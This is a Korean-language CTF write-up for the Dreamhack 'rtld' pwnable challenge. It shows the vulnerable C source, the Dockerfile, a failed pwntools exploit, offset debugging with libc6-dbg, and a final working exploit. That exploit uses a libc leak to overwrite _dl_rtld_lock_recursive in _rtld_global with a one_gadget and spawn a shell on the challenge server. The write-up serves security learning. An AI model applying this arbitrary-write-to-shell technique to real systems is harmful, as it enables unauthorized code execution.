# rtld


```
Ubuntu 16.04
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

**제공 Dockerfile**

```docker
FROM ubuntu:16.04@sha256:1f1a2d56de1d604801a9671f301190704c25d604a416f59e03c04f5c6ffee0d6

ENV user rtld
ENV chall_port 10001

RUN apt-get update
RUN apt-get install -y socat

RUN adduser $user

ADD ./flag /home/$user/flag
ADD ./$user /home/$user/$user

RUN chown -R root:root /home/$user
RUN chown root:$user /home/$user/flag
RUN chown root:$user /home/$user/$user

RUN chmod 755 /home/$user/$user
RUN chmod 440 /home/$user/flag

WORKDIR /home/$user
USER $user
EXPOSE $chall_port
CMD socat -T 30 TCP-LISTEN:$chall_port,reuseaddr,fork EXEC:/home/$user/$user
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <dlfcn.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

int main()
{
    long addr;
    long value;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("addr: ");
    scanf("%ld", &addr);

    printf("value: ");
    scanf("%ld", &value);

    *(long *)addr = value;
    return 0;
}
```

```bash
pwndbg> checksec
File:     /home/alex030905/pwnable/rtld2/rtld
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

**코드 분석**  
이전 문제와 같은 문제다.   

쉘을 내어주는 함수를 추가로 내어줬고, 우분투 버전만 다르다.  
바로 rtld golbal을 조작하러가보자  

주어진 stdout에서 libc 랑 로더 주소까지 다 내어주니 그걸로 rtld 를 수정해주자.   

<br>

```bash
patchelf --set-interpreter ./ld-2.23.so ./rtld
```

<br>

<img width="1772" height="812" alt="image (42)" src="https://github.com/user-attachments/assets/e64d6b2a-af20-452a-b9b0-0e3c18397d13" />

로더랑 오프셋부터 구해주고   

출력된 stdout으로 libc 베이스 주소를 알아낸 뒤 로더 주소도 알아내주고,  
rtld 구조체 주소는 구글링으로 오프셋을 찾아줬다.  

바로 코드를 전부 짜줬다.   

<br>


**실패 익스플로잇 코드**

```bash
from pwn import *

#p = process('./rtld')
p = remote('host3.dreamhack.games', 20131)

e = ELF('./rtld')
libc = ELF('./libc-2.23.so')
ld = ELF('./ld-2.23.so')

p.recvuntil(b': ')

stdout = int(p.recvuntil(b'\n'), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3c5000

print('libc_base..', hex(libc_base))
print('ld_base..', hex(ld_base))

rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lock = rtld_global + 2264
dl_rtld_lock_recursive = rtld_global + 3848

print('rtld_global..', hex(rtld_global))
print('dl_load_lock..', hex(dl_load_lock))
print('dl_rtld_lock_recursive..', hex(dl_rtld_lock_recursive))

e.address = 0x555555400000
get_shell = e.symbols['get_shell'] + e.address 

p.sendlineafter(b'addr: ', str(dl_rtld_lock_recursive).encode())
p.sendlineafter(b'value: ', str(get_shell).encode())

p.interactive()

```

.

.

.

분명 방법이 맞는거 같은데 정답이 안나와서 제대로 된 환경 맞춰서 다시 검증 해보겠다.

### 다시 시도  

<img width="1454" height="871" alt="image (39)" src="https://github.com/user-attachments/assets/4b6b120e-4361-41e5-a7f9-b6c05e1993c5" />

제공해준 도커 파일 그대로 빌드하고 열어줬다.  
추가로 gdb 랑 patchelf 두개만 설치해주고 바로 시작했다.   

근데 벌써 libc 랑 로더 위치가 다르다.   

아무튼 `0x3ca000` 으로 코드를 바꾸고 다시 실행을 해봤는데  

<br>

<img width="1431" height="1068" alt="image (40)" src="https://github.com/user-attachments/assets/c94484a7-9555-4ccf-a8b9-fcd71df6282f" />

안된다.  

이어서 확인해보자.   

<br>

<img width="1459" height="588" alt="image (43)" src="https://github.com/user-attachments/assets/579d5e5f-ab2b-4d0f-b96d-8c9d2320a7f3" />

이제 glibc 의 상세 버전을 알아내준다.   

- `Ubuntu GLIBC 2.23-0ubuntu11.3`

https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu11.3  

여기서 다운 받아야하는 거 찾아주고 아래 링크에 파일을 다운 받았다.   
<br>

다운 링크를 찾느라 고생을 좀 했는데   

- https://launchpad.net/ubuntu/xenial/amd64/libc6-dbg/2.23-0ubuntu11.3

여긴 다운로드 파일이 있는 링크이다  
여기서 다운 링크를 복붙하고 wget 해주면 된다.  

파일 다운링크 : `http://launchpadlibrarian.net/534747094/libc6-dbg_2.23-0ubuntu11.3_amd64.deb`  

```bash
wget http://launchpadlibrarian.net/534747094/libc6-dbg_2.23-0ubuntu11.3_amd64.deb
dpkg -x libc6-dbg_2.23-0ubuntu11.3_amd64.deb ./
```

<br>





<img width="1445" height="918" alt="image" src="https://github.com/user-attachments/assets/7caf11df-07fe-4ad9-862b-39606d1e9d6c" />

파일이 있는 걸 확인할 수 있다.   

`libc6-dbg` 같이 디버깅 파일이 아니면 구조체 변수를 따로 명령어로 찾질 못한다.  

그래서 명령어를 아무리 써도 오프셋을 알아낼 수 없었고 `p &_rtld_global` 로 rtld 주소를 알아낸 뒤 들어있는 값을 쭉 뽑아봐도 대부분 0x00 만 들어있어서 오프셋 가늠이 안됐다.  

<br>


<img width="1300" height="253" alt="image" src="https://github.com/user-attachments/assets/d529909c-5281-4f67-922a-82162aa8599c" />

아무튼 이렇게 오프셋을 알아냈다.  

이전에는 `dl_load_lock` 주소를 2264 로 했는데 2312 였다.  
그래도 이건 문제 푸는데 지장이 없었을거라 상관은 없을텐데 그럼 문제가 뭔지 정확히 나왔다.   

아무래도 리턴 주소를 이상하게 조작한듯하다.   

이부분은 그럼 원가젯으로 대체하자.  

libc 베이스 주소도 나왔겠다 바로 원가젯을 찾아준다.  

<br>


<img width="1748" height="454" alt="image" src="https://github.com/user-attachments/assets/71b096e2-ec50-4a98-991e-ee3b28774c3b" />

이렇게 세개가 나왔고 각각 실행시켜보자.  

<br>

**최종 익스플로잇 코드**  

```python
from pwn import *

#p = process('./rtld')
p = remote('host8.dreamhack.games', 23034)

e = ELF('./rtld')
libc = ELF('./libc-2.23.so')
ld = ELF('./ld-2.23.so')

p.recvuntil(b': ')

stdout = int(p.recvuntil(b'\n'), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3ca000

print('libc_base..', hex(libc_base))
print('ld_base..', hex(ld_base))

rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lock = rtld_global + 2312
dl_rtld_lock_recursive = rtld_global + 3848

print('rtld_global..', hex(rtld_global))
print('dl_load_lock..', hex(dl_load_lock))
print('dl_rtld_lock_recursive..', hex(dl_rtld_lock_recursive))

one_gadget = libc_base + 0x4527a
#one_gadget = libc_base + 0xf03a4 < Failed address
#one_gadget = libc_base + 0x45226 < Failed address

p.sendlineafter(b'addr: ', str(dl_rtld_lock_recursive).encode())
p.sendlineafter(b'value: ', str(one_gadget).encode())

p.interactive()
```

`one_gadget = libc_base + 0x4527a` 일 때만 실행이 된다.  

<br>

<img width="1621" height="1119" alt="image" src="https://github.com/user-attachments/assets/4d543ddd-104d-4906-a81a-619f9bcf65b2" />

성공 gg
